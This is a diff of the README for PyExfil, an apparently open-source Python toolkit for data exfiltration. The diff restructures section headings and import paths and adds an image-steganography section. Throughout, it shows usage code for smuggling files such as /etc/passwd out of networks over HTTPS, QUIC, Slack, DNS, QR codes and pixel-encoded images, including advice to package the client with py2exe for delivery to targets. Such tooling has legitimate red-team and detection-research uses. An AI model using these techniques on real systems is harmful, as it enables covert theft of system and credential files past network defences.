@@ -20,9 +20,9 @@ The release of Symantec's Regin research was the initiator of this module. It is
 ## Server Installation
 All requirements can be met with a `pip install --user -r requirments.txt`. After that the server is easy to execute. Notice that in some cases you might want to use `py2exe` before delivering the package to the code you want to operate.
 
-## Techniques
+## Physical
 
-### Physical - QR
+### QR Codes
 
 So recently we have decided to impliment some physical data exfiltration techniques assuming some networks might be airgapped from any internet connectivity. So this is the first one. It will encode a file in several QR codes, display them on the screen one by one and it comes with a decoder to recompile that into the file itself.
 
@@ -60,6 +60,8 @@ if __name__ == "__main__":
 
 ```
 
+## Network Exfiltration
+
 ### DNS
 This will allow establish of a listener on a DNS server to grab incoming DNS queries. It will then harvest them for files exfiltrated by the client. It **does not** yet allow simultaneous connections and transfers. DNS packets will look good to most listeners and *Wireshark* and *tcpdump* (which are the ones that have been tested) will show normal packet and not a 'malformed packet' or anything like that.
 
@@ -68,7 +70,7 @@ With this method you are configuring an HTTP server to impersonate the certifica
 
 #### Server Setup - String Mode
 ```python
-from pyexfil.HTTPS.https_server import HTTPSExfiltrationServer
+from pyexfil.network.HTTPS.https_server import HTTPSExfiltrationServer
 
 server = HTTPSExfiltrationServer(host="127.0.0.1", key="123", port=443, max_connections=5, max_size=8192)
 server.startlistening()
@@ -76,7 +78,7 @@ server.startlistening()
 
 #### Client Setup - String Mode
 ```python
-from pyexfil.HTTPS.https_client import HTTPSExfiltrationClient
+from pyexfil.network.HTTPS.https_client import HTTPSExfiltrationClient
 
 client = HTTPSExfiltrationClient(host='127.0.0.1', key="123", port=443, max_size=8192)
 client.sendData("ABC")
@@ -86,7 +88,7 @@ client.close()
 
 #### Server Setup - File Mode
 ```python
-from pyexfil.HTTPS.https_server import HTTPSExfiltrationServer
+from pyexfil.network.HTTPS.https_server import HTTPSExfiltrationServer
 
 server = HTTPSExfiltrationServer(host="127.0.0.1", key="123", port=443, max_connections=5, max_size=8192, file_mode=True)
 server.startlistening()
@@ -94,7 +96,7 @@ server.startlistening()
 
 #### Client Setup - File Mode
 ```python
-from pyexfil.HTTPS.https_client import HTTPSExfiltrationClient
+from pyexfil.network.HTTPS.https_client import HTTPSExfiltrationClient
 
 client = HTTPSExfiltrationClient(host='127.0.0.1', key="123", port=443, max_size=8192)
 client.sendFile("/etc/passwd")
@@ -135,7 +137,7 @@ Slack exfiltration uses the Slack API to move files around. Please notice you wi
 
 #### Slack Server
 ```python
-from pyexfil.Slack.slack_server import SlackExfiltrator
+from pyexfil.network.Slack.slack_server import SlackExfiltrator
 
 slackExf = SlackExfiltrator(slackSlaveID="11111FD", slackToken="xoxo-abc", encKey="Abc!23")
 slackExf._connect2Slack()
@@ -145,7 +147,7 @@ slackExf.Listen()
 #### Slack Client
 
 ```python
-from pyexfil.Slack.slack_server import SlackExfiltrator
+from pyexfil.network.Slack.slack_server import SlackExfiltrator
 
 slackExf = SlackExfiltrator(slackID="11111FD", slackToken="xoxo-abc", encKey="Abc!23")
 slackExf._connect2Slack()
@@ -160,7 +162,7 @@ In the future, we should add the things mentioned above. Currently, this does no
 
 #### Server
 ```python
-from pyexfil.QUIC.quic_server import HTTPSExfiltrationServer
+from pyexfil.network.QUIC.quic_server import HTTPSExfiltrationServer
 
 server = HTTPSExfiltrationServer(host="127.0.0.1", key="123")
 server.startlistening()
@@ -168,7 +170,7 @@ server.startlistening()
 
 #### Client
 ```python
-from pyexfil.QUIC.quic_client import QUICClient
+from pyexfil.network.QUIC.quic_client import QUICClient
 
 client = QUICClient(host='127.0.0.1', key="123", port=443)      # Setup a server
 
@@ -179,6 +181,49 @@ sys.stdout.write("[.]\tExfiltrating with CID: %s.\n" % a)
 
 client.sendFile("/etc/passwd")                                  # Exfil File
 client.close()
+```
+
+## Steganography
+
+### Binary Offset
+
+The binary offset technique will take a file, (zlib it), convert it into a binary string *b01010101...*, and then take an image, and convert it into a pixel array with 3 entities per pixel `(int(R),int(G),int(B))`. In case where the image has a transperancy pixel (PNG for example) the PyExfil will currently ignore it. Then the binary string will be incorprated into the pixel array and saved in another location.
+
+The result, is an image file that contains all the data. Without the original image file you cannot decode the image as there is nothing to compare the changes to.
+
+#### As SA Module
+
+If you wish to encode or decode an image in the most manual way you can use the module as a stand alone executable (py2exe anyone?).
+
+```bash
+binoffset.py baseimage "originalImage.jpg" "outputpath.jpg"
+binoffset.py encode "baseImage.jpg" "/etc/passwd" "newImage.jpg"
+binoffset.py decode "newImage.jpg" "baseImage.jpg" "passwdFile"
+```
+
+So in total, the stages are:
+
+1. Convert an image to a reliable base image for the use by this technique.
+2. Take the file `/etc/passwd` and use the base image `baseImage.jpg` to create a new image named `newImage.jpg` with all the data from `/etc/passwd` encorporated into it.
+3. Take the image containing the data along with the base image and give me a file named `passwdFile` with all the content of `/etc/passwd` in it.
+
+#### As a Python Module
+
+```python
+from pyexfil.Stega.binoffset.binoffset import PrepareBaseImage, DecodeExfiltrationFile, CreateExfiltrationFile
+
+originalImage = 'myLogo.png'      # Image downloaded from the internet
+fileToExfiltrate = '/etc/passwd'  # The file you want to embed in the picture
+
+# Prepare image for use
+PrepareBaseImage(imagePath=originalImage, outputPath="base_"+originalImage)
+
+# On the machine with the file
+CreateExfiltrationFile(originalImage="base_"+originalImage, rawData=fileToExfiltrate, OutputImage="niceImage.png")
+
+# After getting the image back, use this to decode it
+DecodeExfiltrationFile(originalImage="base_"+originalImage, newImage="niceImage.png", outputPath="passwd.file")
+
 ```
 
 ## Future Stuff
